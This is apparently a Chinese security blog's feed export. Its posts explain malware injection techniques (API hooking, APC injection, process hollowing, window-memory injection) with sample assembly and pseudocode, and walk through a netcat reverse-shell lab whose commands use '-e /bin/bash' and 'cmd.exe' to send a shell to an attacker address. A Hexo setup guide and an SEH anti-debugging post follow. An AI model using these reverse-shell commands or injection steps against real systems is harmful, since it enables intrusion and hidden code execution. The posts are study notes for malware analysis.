title="1.IAT_HOOK技术【复杂且不友好】"></a>1.IAT_HOOK技术【复杂且不友好】</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在一个windows应用程序中，人们所编写的代码所占的比例不到20%，其他都是导入的是库文件（windows下主要是dll文件），dll文件的存在大大简化了人们的工作，同样的也减少了程序所运行的成本，因为在一个dll文件中不是所有函数都会被使用。在.exe文件中存在一个叫做IAT（导入地址表）的表，这个表存在的原因就是便于程序去dll文件中寻找特定的函数。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个正常的exe使用IAT的过程如下：程序调用了某个dll中的函数，首先回去程序自带的IAT中寻找改函数在dll中所处的地址，然后调用一个jmp跳转到dll！FUN()所在的地址，继续执行。【windows加载器会在程序运行时把dll中函数的地址存储在IAT中，当然程序第一个调用的是IAT的地址】<br>    <img src="https://i.imgur.com/DKkEngR.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果程序被IAT_HOOK的话，过程是这样的。首先先使用DLL注入把含有恶意代码的DLL注入到进程内部，并修改IAT数据，程序和正常过程一样调用IAT的地址，但是此时IAT的函数地址并不是正常的函数地址，jmp到恶意的函数中执行，执行完恶意代码后call到正常的dll中。然后retn。<br>    <img src="https://i.imgur.com/fYLAiIV.png" alt=""></p><h2 id="2-InLine-HOOK技术"><a href="#2-InLine-HOOK技术" class="headerlink" title="2.InLine_HOOK技术"></a>2.InLine_HOOK技术</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InLine_HOOK技术和IAT_HOOK技术同样是钩取需要调用的API函数，区别在于InLine_HOOK并不是钩取IAT的数据，而是直接修改API函数内前5个字节，将其修改为<strong>JMP XXXXXXXX(恶意代码地址）</strong>。当然在修改后要恢复修改的内容以便原函数能够正确的执行。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基本过程如下：正常调用API，在钩取前要修改原函数前5个字节，（1）做一个JMP，跳转到恶意代码，利用寄存器存储恶意代码地址，（2）然后跳转到原函数，还原原函数开始的前五个字节，以便正常执行原函数，（3)利用之前存储的地址，我们call过去，这样就到达了恶意代码处，(4)恶意代码执行完毕，返回正常执行原API函数，(5)最后返回用户领空.<br>    <img src="https://i.imgur.com/r4Disvj.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是一次关于InLine_HOOK的分析案例：</p><ul><li>在这里，先是利用App_Lnit技术加载了恶意的dll.以便后续的钩取。<br>  <img src="https://i.imgur.com/4ueB0FJ.png" alt=""></li><li>然后暂定线程，以便后续修改函数<br>  <img src="https://i.imgur.com/3G4idNi.png" alt=""></li><li>程序首先对进程进行快照，在快照列表中寻找符合要求的进程名，如果有则下一步<br>  <img src="https://i.imgur.com/lVkDgtl.png" alt=""></li><li>先获取当前的进程ID，然后把wsock32.dll和send函数作为参数压入。<br>  <img src="https://i.imgur.com/dBFrI8b.png" alt=""></li><li>如图，a2是钩取函数的地址，a2-ipAddress是为了获得两个进程的相对距离，-5是为了获得jmp xxxxxxxxx的大小，然后调用VirtuaProtect获得进程内存的权限。以便下面的修改，修改之后继续调用VirtaulProtect恢复进程原来状态<br>  <img src="https://i.imgur.com/AdGNXow.png" alt=""></li><li>最后恢复执行线程<br>  <img src="https://i.imgur.com/P2sPZU2.png" alt=""></li></ul><h1 id="第五部分：APC注入"><a href="#第五部分：APC注入" class="headerlink" title="第五部分：APC注入"></a>第五部分：APC注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链，他在线程处于可警告的等待状态时被执行。恶意代码为了使得自己立即被执行，他们会利用APC抢占处于等待状态的线程。</p><h2 id="用户模式下的APC注入"><a href="#用户模式下的APC注入" class="headerlink" title="用户模式下的APC注入"></a>用户模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序利用QueueUserAPC()函数调用远程函数，<strong>该函数的参数为pfnAPC,hThread,dwData,（1）目标线程的句柄; 2）指向恶意软件想要运行的函数指针; 3）和传递给函数指针的参数）。其要求hThread调用数值为dwData的pfnAPC定义的函数。</strong>当然线程处于等待状态是APC注入的前提，一般的注入svchost.exe，我们也可以调用SleepEx，SignalObjectAndWait，MsgWaitForMultipleObjectsEx，WaitForMultipleObjectsEx或WaitForSingleObjectEx函数，线程将进入可警醒状态。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwThreadId]</div><div class="line"><span class="keyword">push</span> <span class="number">0</span></div><div class="line"><span class="keyword">push</span> <span class="number">10h</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:OpenThread</div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">test</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line"><span class="keyword">jz</span> short Loc_401DCE</div><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwData]    <span class="comment">;dbnet.dll</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">esi</span>             <span class="comment">;hThread</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:LoadLibraryA <span class="comment">;pfnAPC</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:QueueUserAPC</div><div class="line"><span class="comment">;调用QueueUserAPC对pThread进程调用参数为dbnet.dll的LoadLibrary函数</span></div></pre></td></tr></table></figure></p><pre><code>![](https://i.imgur.com/Tb9YAz1.png)</code></pre><h2 id="内核模式下的APC注入"><a href="#内核模式下的APC注入" class="headerlink" title="内核模式下的APC注入"></a>内核模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用KeInitializeAPC()和KeInsertQueueAPC()进行APC注入。</p><h1 id="第六部分：进程替换技术-进程hollowing"><a href="#第六部分：进程替换技术-进程hollowing" class="headerlink" title="第六部分：进程替换技术(进程hollowing)"></a>第六部分：进程替换技术(进程hollowing)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了注入之外，我们还可以使用进程替换技术将一个可执行文件写入一个运行的进程内部，这种技术让恶意代码拥有和被替换进程相同的特权，<strong>这个技术关键是：需要以挂起状态创建进程，也就是说，这个进程将会被载入内存，但是主线程过去，在外部程序恢复主线程之前，程序不会工作，恢复主线程之后，程序工作。</strong>如下代码是进程替换代码的伪代码.该程序通过调用CreateProcess<strong>并将进程创建标志设置为CREATE_SUSPENDED（0x00000004）完成。新进程的主线程被创建为挂起状态，</strong>直到ResumeThread函数被调用才会运行。接下来，恶意软件需要用恶意的有效载荷来替换合法文件的内容。这可以通过调用ZwUnmapViewOfSection或NtUnmapViewOfSection来取消映射目标进程的内存。这两个API基本上释放了一个部分指向的所有内存。现在内存被取消映射，加载器执行VirtualAllocEx为恶意软件分配新内存，并使用WriteProcessMemory将每个恶意软件的部分写入目标进程空间。恶意软件调用SetThreadContext将entrypoint指向已编写的新代码段。最后，恶意软件通过调用ResumeThread来恢复挂起的线程。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcess</span><span class="params">(...,<span class="string">"目标进程.exe"</span>,CREATE_SUSPENDED)</span></span>；<span class="comment">//以挂起状态创建进程</span></div><div class="line"><span class="function"><span class="title">ZwUnmapviewOfSection</span><span class="params">()</span></span>                             <span class="comment">//释放内存，解除内存映射</span></div><div class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">()</span></span>                                   <span class="comment">//为恶意代码分配新空间</span></div><div class="line"><span class="function"><span class="title">writeProcessMenory</span><span class="params">(header)</span></span>                         <span class="comment">//写入数据（文件头）</span></div><div class="line"><span class="function"><span class="title">for</span><span class="params">(i=<span class="number">0</span>;i&lt;NumberOfSection;i++)</span></span></div><div class="line">WriteProcessMenory(section)                    <span class="comment">//写入节区数据</span></div><div class="line">···</div><div class="line"><span class="function"><span class="title">ResumeThread</span><span class="params">()</span></span>                                     <span class="comment">//重新启动主线程</span></div></pre></td></tr></table></figure></p><pre><code>![](https://i.imgur.com/Kv6WZ0V.png)</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有一个类似于进程hollowing的技术，叫做线程执行劫持。他针对进程中的现有线程，避免产生其他新的线程，先是查找线程，并且利用openThread打开目标线程，在获取目标线程的句柄后，恶意软件通过调用SuspendThread来将线程置于挂起模式。调用VirtualAllocEx和WriteProcessMemory来分配内存并执行代码注入的操作。然后调用GetThreadContext和GetThreadContext获取并设置线程的上下文，以将EIP寄存器设置到要执行恶意代码的地址，达到重启线程的作用。<br>    <img src="https://i.imgur.com/bTHGlVo.png" alt=""></p><h1 id="第七部分：PE注入"><a href="#第七部分：PE注入" class="headerlink" title="第七部分：PE注入"></a>第七部分：PE注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个技术类似于代码注入，但是与代码注入有所不同，更加像是把整个pe文件注入到进程，操作方法与进程替换的步骤又有所相像。这里暂时不做理会。</p><h1 id="第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI"><a href="#第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI" class="headerlink" title="第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)"></a>第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EWMI依靠注入资源管理器托盘窗口的额外窗口内存，并在恶意软件家族中被多次使用使用，如Gapz和PowerLoader。在注册窗口类时，应用程序可以指定一些额外的内存字节，称为额外的窗口存储器（EWM）。 然而，EWM并不算是块很充裕的空间。 为了规避这个限制，恶意软件将代码写入explorer.exe的共享部分，并使用SetWindowLong和SendNotifyMessage来指定一个指向shellcode的函数指针，然后执行它。当涉及到向共享部分的写入数据时，恶意软件有两个选择：它可以也创建一个共享空间，并将其映射到自身和另一个进程（例如，explorer.exe）；第二个选择就是简单地打开已经存在的共享部分。 前者具有分配堆空间和调用NTMapViewOfSection以及其他一些API调用的开销，因此后一种方法被更频繁地使用。 恶意软件在共享部分中写入其shellcode后，使用GetWindowLong和SetWindowLong访问并修改“Shell_TrayWnd”的额外窗口内存。 GetWindowLong是用于将指定偏移量的32位值检索到窗口类对象的额外窗口存储器中的API，SetWindowLong用于更改指定偏移量的值。 通过这样做，恶意软件可以简单地更改窗口类中的函数指针的偏移量，并将其指向写入共享部分的shellcode。像上面提到的大多数其他技术一样，恶意软件需要触发它编写的代码。 在以前讨论的技术中，恶意软件通过调用API（如CreateRemoteThread，QueueUserAPC或SetThreadContext）来实现这一点。 在EWMI方法中，恶意软件通过调用SendNotifyMessage触发注入的代码。 在执行SendNotifyMessage之后，Shell_TrayWnd接收并将控件传递给由SetWindowLong先前设置的值指向的地址。 在图13中，名为PowerLoader的恶意软件使用这种技术。 </p><h1 id="第九部分："><a href="#第九部分：" class="headerlink" title="第九部分："></a>第九部分：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft向开发人员提供了Shims[译者注：Shim是一个工程术语，描述为了让两个物体更好地组装在一起而插入的一块木头或金属。在计算机编程中，shim是一个小型的函数库，用于透明地拦截API调用，修改传递的参数、自身处理操作、或把操作重定向到其他地方。Shim也可以用来在不同的软件平台上运行程序。]，主要是为了向后兼容。 Shims允许开发人员将修补程序应用于程序，而无需重写代码。 通过利用Shims，开发人员可以告诉操作系统如何处理其应用程序。 Shims本质上是一种嵌入API并针对特定可执行文件的方式。 恶意软件可以利用Shims来实现注入可执行文件并维持注入。 Windows运行Shim引擎时，它加载二进制文件以检查shimming数据库，以便应用适当的修补程序。有许多可以使用的修复程序，但是恶意软件还是更偏爱那些安全相关的（例如DisableNX，DisableSEH，InjectDLL等）。要安装shimming数据库，恶意软件可以使用各种方法。 例如，一个常见的方法是简单执行sdbinst.exe，并将其指向恶意的sdb文件。 在图14中，广告软件“Search Protect by Conduit”使用Shims进行注入和维持。 它在Google Chrome中执行“InjectDLL”shim以加载vc32loader.dll。 现在有一些用于分析sdb文件的工具，但是对于下面列出的sdb的分析，我使用了python-sdb，而没有使用现成的工具。 </p><h1 id="第十部分：说明"><a href="#第十部分：说明" class="headerlink" title="第十部分：说明"></a>第十部分：说明</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇博客，我主要参考的是逆向工程核心原理23.27.30-32等章节和恶意代码分析实战，以及来自看雪的一篇文章<a href="https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session" target="_blank" rel="external">https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session</a> Manager\AppCertDlls可能需要自己写入。因为AppCertDlls并不存在。<br>     <img src="https://i.imgur.com/O1rKkl5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第一部分：Rootkit技术&quot;&gt;&lt;a href=&quot;#第一部分：Rootkit技术&quot; class=&quot;headerlink&quot; title=&quot;第一部分：Rootkit技术&quot;&gt;&lt;/a&gt;第一部分：Rootkit技术&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用procexp能看到。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反向shell</title>
    <link href="http://yoursite.com/2018/02/02/%E5%8F%8D%E5%90%91shell%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/02/反向shell技术/</id>
    <published>2018-02-02T08:45:11.000Z</published>
    <updated>2018-02-09T16:50:29.491Z</updated>
    
    <content type="html"><![CDATA[<p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。</strong></p><h1 id="第一部分：反向shell介绍"><a href="#第一部分：反向shell介绍" class="headerlink" title="第一部分：反向shell介绍"></a>第一部分：反向shell介绍</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在这个模型中，一般的都是服务器对客户机发送请求。这个可以理解为正向的连接（正向shell），那么所谓的反向shell呢？反向shell是从被感染的机器中发起一个连接，他提供攻击者访问被感染机器的权限。现在主要流行两种反向shell的方法。第一种是<strong>netcat反向shell，</strong>还有一种是<strong>windows反向shell</strong>。<a id="more"></a></p><h1 id="第二部分：工具使用"><a href="#第二部分：工具使用" class="headerlink" title="第二部分：工具使用"></a>第二部分：工具使用</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用netcat反向shell需要使用的工具是netcat。在网络工具中有“瑞士军刀”美誉。<br><figure class="highlight plain"><figcaption><span>-p -e这三个参数</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-C               类似-L选项，一直不断连接[1.13版本新加的功能]</div><div class="line">-d               后台执行</div><div class="line">-e prog          程序重定向，一旦连接，就执行 [危险！！]</div><div class="line">-g gateway       源路由跳数,最大值为8(source-routing hop point[s],up to 8)</div><div class="line">-G num           源路由指针:4,8,12,... (source-routing pointer: 4,8,12,...)</div><div class="line">-h               帮助信息</div><div class="line">-i secs          延时的间隔</div><div class="line">-l               监听模式，用于入站连接</div><div class="line">-n               指定数字的IP地址，不能用hostname</div><div class="line">-o file          记录16进制的传输</div><div class="line">-p port          本地端口号</div><div class="line">-r               任意指定本地及远程端口</div><div class="line">-s addr          本地源地址</div><div class="line">-u               UDP模式,[netcat-1.15可以:远程nc -ulp port -e cmd.exe，本地nc -u ip port连接，得到一个shell.]</div><div class="line">-v               详细输出——用两个-v可得到更详细的内容</div><div class="line">-w secs          指定超时的时间</div><div class="line">-z               将输入输出关掉——用于扫描时</div></pre></td></tr></table></figure></p><h1 id="第三部分：利用netcat创建反向shell"><a href="#第三部分：利用netcat创建反向shell" class="headerlink" title="第三部分：利用netcat创建反向shell"></a>第三部分：利用netcat创建反向shell</h1><p>0.前提：利用虚拟机，攻击者是linux虚拟机，被攻击者是windows xp，linux的网络地址配置如下（等下要用），并将两台虚拟机都设置成主机模式。<br>     <img src="https://i.imgur.com/CCfyQLJ.png" alt=""></p><p>1.首先，我们在攻击者机器中设置一个监听，主要监听的是8888端口，我们监听的端口主要选择一些没有被使用过的端口，一般的1000多的端口都没有被使用。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc lvp <span class="number">8888</span></div></pre></td></tr></table></figure></p><p>2.在被攻击者机器中发送链接请求：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于Linux机器来说，使用一下命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc <span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span> <span class="number">8888</span> -e / bin / bash</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于windows机器来说，使用以下命令：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">nc</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.221</span><span class="selector-class">.129</span> 8888 <span class="selector-tag">-e</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span></div></pre></td></tr></table></figure></p><p>如图所示<br>    <img src="https://i.imgur.com/CsRYflh.png" alt=""></p><p>3.至此，我们在攻击者机器中就获得了与被攻击者同等权限的shell了，那么我们打开对我们被攻击者做出一些操作。就是反应有点慢。<br>    <img src="https://i.imgur.com/At9qTb9.png" alt=""></p><p>4.这个只是了解反向shell的基本原理，在实践中很难被利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;第一部分：反向shell介绍&quot;&gt;&lt;a href=&quot;#第一部分：反向shell介绍&quot; class=&quot;headerlink&quot; title=&quot;第一部分：反向shell介绍&quot;&gt;&lt;/a&gt;第一部分：反向shell介绍&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在这个模型中，一般的都是服务器对客户机发送请求。这个可以理解为正向的连接（正向shell），那么所谓的反向shell呢？反向shell是从被感染的机器中发起一个连接，他提供攻击者访问被感染机器的权限。现在主要流行两种反向shell的方法。第一种是&lt;strong&gt;netcat反向shell，&lt;/strong&gt;还有一种是&lt;strong&gt;windows反向shell&lt;/strong&gt;。
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>重新配置hexo博客</title>
    <link href="http://yoursite.com/2018/01/29/%E9%87%8D%E6%96%B0%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2018/01/29/重新配置hexo博客/</id>
    <published>2018-01-29T12:45:11.000Z</published>
    <updated>2018-01-29T10:18:06.745Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一步：下载Git和Node</strong></p><p><strong>第二歩：在桌面右键启动git 然后安装hexo:<br></strong><br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g hexo-<span class="keyword">cli</span></div></pre></td></tr></table></figure></p><a id="more"></a><p><strong>第三步：接着在文件夹里右键git，输入以下命令，然后在浏览器中输入localhost：4000看是否能本地预览</strong><br><br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo -s(或者hexo <span class="keyword">server</span>)</div></pre></td></tr></table></figure></p><p><strong>第四步：在Git下输入以下命令:(邮箱改成你的)</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh-keygen</span> <span class="selector-tag">-t</span> <span class="selector-tag">rsa</span> <span class="selector-tag">-C</span> "1434905079@<span class="keyword">qq</span>.<span class="keyword">com</span>"</div></pre></td></tr></table></figure></p><p><strong>第五步：打开 C:\Users\bxm09.ssh\id_rsa.pub，此文件里面内容为刚才生成的密钥，准确的复制这个文件的内容，粘贴到<a href="https://github.com/settings/ssh" target="_blank" rel="external">https://github.com/settings/ssh</a> 的 new SSH key 中</strong></p><p><strong>第六步：测试，输入以下命令：不要修改<br></strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-T</span> <span class="selector-tag">git</span>@<span class="keyword">github</span>.<span class="keyword">com</span></div></pre></td></tr></table></figure></p><p>得到以下反馈：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">The</span> <span class="selector-tag">authenticity</span> <span class="selector-tag">of</span> <span class="selector-tag">host</span> ‘<span class="selector-tag">github</span><span class="selector-class">.com</span> (<span class="number">207.97</span>.<span class="number">227.239</span>)’ <span class="selector-tag">can</span>’<span class="selector-tag">t</span> <span class="selector-tag">be</span> <span class="selector-tag">established</span>.</div><div class="line"><span class="selector-tag">RSA</span> <span class="selector-tag">key</span> <span class="selector-tag">fingerprint</span> <span class="selector-tag">is</span> <span class="selector-tag">16</span><span class="selector-pseudo">:27</span><span class="selector-pseudo">:ac</span><span class="selector-pseudo">:a5</span><span class="selector-pseudo">:76</span><span class="selector-pseudo">:28</span><span class="selector-pseudo">:2d</span><span class="selector-pseudo">:36</span><span class="selector-pseudo">:63</span><span class="selector-pseudo">:1b</span><span class="selector-pseudo">:56</span><span class="selector-pseudo">:4d</span><span class="selector-pseudo">:eb</span><span class="selector-pseudo">:df</span><span class="selector-pseudo">:a6</span><span class="selector-pseudo">:48.</span></div><div class="line"><span class="selector-tag">Are</span> <span class="selector-tag">you</span> <span class="selector-tag">sure</span> <span class="selector-tag">you</span> <span class="selector-tag">want</span> <span class="selector-tag">to</span> <span class="selector-tag">continue</span> <span class="selector-tag">connecting</span> (yes/no)?</div></pre></td></tr></table></figure></p><p>输入yes</p><p><strong>第七步：现在你已经可以通过 SSH 链接到 GitHub 了，还有一些个人信息需要完善的。Git 会根据用户的名字和邮箱来记录提交。GitHub 也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的。</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"findream"</span></div></pre></td></tr></table></figure></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"1434905079@qq.com"</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第一步：下载Git和Node&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二歩：在桌面右键启动git 然后安装hexo:&lt;br&gt;&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight avrasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install -g hexo-&lt;span class=&quot;keyword&quot;&gt;cli&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈SEH反调试技术</title>
    <link href="http://yoursite.com/2018/01/24/%E6%B5%85%E8%B0%88SEH%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/01/24/浅谈SEH技术/</id>
    <published>2018-01-24T13:20:11.000Z</published>
    <updated>2018-01-25T09:57:06.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>SEH(“Structured Exception Handling”),即结构化异常处理·是(windows)操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。它不依托于设计语言，只依托于操作系统，这些并不是编译程序本身所固有的,本质上只不过是对windows内在提供的结构化异常处理的包装。</strong><br><strong>参看资料：</strong><br><strong>1.逆向工程核心原理</strong><br><strong>2.<a href="https://www.52pojie.cn/thread-16609-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-16609-1-1.html</a></strong><br><strong>3.<a href="https://bbs.pediy.com/thread-27224.html" target="_blank" rel="external">https://bbs.pediy.com/thread-27224.html</a></strong><br><strong>4.<a href="https://bbs.pediy.com/thread-12449.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-12449.htm</a></strong><br><strong>5.<a href="https://bbs.pediy.com/thread-189193.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-189193.htm</a></strong><br><a id="more"></a></p><h1 id="第一部分：windows系统的几种常见的异常"><a href="#第一部分：windows系统的几种常见的异常" class="headerlink" title="第一部分：windows系统的几种常见的异常"></a>第一部分：windows系统的几种常见的异常</h1><ul><li>异常：<ul><li>1）内存非法访问异常（Exception_Access_Violation）<ul><li>1.1) MOV DS:[0],123   —0号区域未被分配</li><li>1.2) MOV DS:[40100],123  —.test节区起始地址只有读取权限</li><li>1.3）MOV DS:[80000],123  —内核区域</li><li>1.4）说明：0号地址虽然属于用户区域但是，该地址没有被分配。</li></ul></li><li>2）断点异常（Exception_BreakPoint）<ul><li>2.1）软件断点    —int 3</li><li>2.2）硬件断点    —对某一个地址下断点</li></ul></li><li>3）CPU无法解析异常（Exception_Illegal_Instruction）<ul><li>3.1)某一个指令集不在cpu解析的指令之中</li></ul></li><li>4）除0异常</li><li>5）单步异常</li></ul></li></ul><h1 id="第二部分：SEH介绍"><a href="#第二部分：SEH介绍" class="headerlink" title="第二部分：SEH介绍"></a>第二部分：SEH介绍</h1><p><strong>1.SEH链：SEH是以链状形式存在，如果异常没有被第一个异常处理函数处理，那么就会传递给下一个异常处理函数。</strong><br>    <img src="https://i.imgur.com/qiZyz0w.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">typedef struct _Exception_SEH_List</div><div class="line">&#123;</div><div class="line">PException_SEH *next;    //*next指针指向下一个节点，</div><div class="line">PException_DISPOSITION handle;    //handle指向一个异常处理函数。</div><div class="line">&#125;_Exception_SEH_List,*_Exception_SEH_List;</div></pre></td></tr></table></figure></p><p>*next指针指向下一个节点，handle指向一个异常处理函数。<br>    <img src="https://i.imgur.com/KHhEkKj.png" 